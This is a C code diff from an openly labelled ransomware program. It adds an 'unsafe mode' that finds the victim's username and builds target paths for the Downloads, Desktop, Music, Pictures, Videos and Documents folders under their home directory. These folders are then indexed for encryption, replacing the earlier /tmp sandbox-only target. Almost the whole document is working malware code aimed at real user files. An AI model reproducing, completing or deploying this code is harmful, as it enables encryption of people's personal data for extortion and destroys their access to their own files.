@@ -23,17 +23,18 @@ int g_decryption = 0;
 /**
  * @brief Initialize an area with useless files to execute the ransomware in safe mode.
 */
-void init_safe_mode_area()
+char** init_safe_mode_area()
 {
 
-    char* p_sandboxPath = "/tmp/sandbox-ransomware";
+    char* p_sandboxPath = "/tmp/sandbox-ransomware/";
+    char** pp_paths = malloc(sizeof(char*));
 
     printf("[+] Initializing safe mode area\n");
 
     /* Test if sandbox environment already exist */
     struct stat sb;
 
-    if (stat(p_sandboxPath, &sb)){
+    if (stat(p_sandboxPath, &sb) && g_encryption){
 
         /* Create sandbox directory in /tmp/ */
         if (mkdir(p_sandboxPath, 0777) == -1)
@@ -72,14 +73,66 @@ void init_safe_mode_area()
         }
     }
 
+    *pp_paths = malloc(sizeof(char*) * (strlen(p_sandboxPath) + 1));
+    if (*pp_paths == NULL)
+    {
+        perror("[-] Sandbox files creation failed");
+        exit(1);
+    }
+    sprintf(*pp_paths, "%s", p_sandboxPath);
+
     printf("[+] Safe mode area initialized\n");
 
+    return pp_paths;
+
+}
+
+char** init_unsafe_mode()
+{
+    char* pp_targetFolders[] = {"Downloads/", "Desktop/", "Music/", "Pictures/", "Videos/", "Documents/"};
+    char* p_pathBase = NULL;
+    char** pp_paths = NULL;
+
+    /* Get victim username */
+    char* p_login = get_username();
+
+    p_pathBase = malloc(strlen("/home/") + strlen(p_login) + 2);
+    if (p_pathBase == NULL) {
+        perror("[-] malloc failed");
+        exit(1);
+    }
+
+    sprintf(p_pathBase, "/home/%s/", p_login);
+
+    /* Allocate memory for paths */
+    pp_paths = malloc(sizeof(char*) * (sizeof(pp_targetFolders) / sizeof(pp_targetFolders[0])));
+    if (pp_paths == NULL) {
+        perror("[-] malloc failed");
+        exit(1);
+    }
+
+    // Build paths and store them in the array
+    for (int i = 0; i < sizeof(pp_targetFolders) / sizeof(pp_targetFolders[0]); i++) {
+        pp_paths[i] = malloc(strlen(p_pathBase) + strlen(pp_targetFolders[i]) + 1);
+        if (pp_paths[i] == NULL) {
+            perror("[-] malloc failed");
+            exit(1);
+        }
+        sprintf(pp_paths[i], "%s%s", p_pathBase, pp_targetFolders[i]);
+    }
+
+    free(p_pathBase);
+
+    printf("[+] Unsafe mode initialized\n");
+
+    return pp_paths;
 }
 
 int main(int argc, char const *argv[])
 {
+    char** pp_paths = NULL;
+    int countPaths = 1;
 
-    char* paths[] = {"/tmp/sandbox-ransomware/"};
     unsigned char* p_algo = NULL;
     unsigned char* p_iv = NULL;
     unsigned char* p_key = NULL;
@@ -98,6 +151,11 @@ int main(int argc, char const *argv[])
             {
                 printf("[+] Safe mode disabled\n");
                 g_safeMode = 0;
+
+                /* Initialize unsafe mode */
+                pp_paths = init_unsafe_mode();
+
+                countPaths = 6;
             }
         } else if (strcmp(argv[i], "--encrypt") == 0)
         {
@@ -120,17 +178,17 @@ int main(int argc, char const *argv[])
         exit(1);
     }
 
-    if (g_safeMode && g_encryption)
+    if (g_safeMode)
     {
         printf("[+] Ransomware in safe mode\n");
-        init_safe_mode_area();
+        pp_paths = init_safe_mode_area();
     }
 
     /* Initialisation de la structure pour la recherche de fichier */
     listFileData* p_listFileData = init_list_file_data();
 
     /* Indexation des fichiers à chiffrer */
-    files_finder(p_listFileData, paths, 1);
+    files_finder(p_listFileData, pp_paths, countPaths);
 
     /* Affichage des fichiers indexés */
     print_path_data(p_listFileData);
@@ -197,7 +255,6 @@ int main(int argc, char const *argv[])
         free(p_key);
         free(p_algo);
         free(p_benchmarkData);
-
     }
 
     if (g_decryption)
@@ -257,9 +314,13 @@ int main(int argc, char const *argv[])
         free(p_algo);
     }
 
-    /* Free memory */
+    for (int i = 0; i < countPaths; i++) {
+        free(pp_paths[i]);
+    }
+
     free_path_data(p_listFileData);
     free(p_macAddress);
+    free(pp_paths);
 
     return 0;
 }
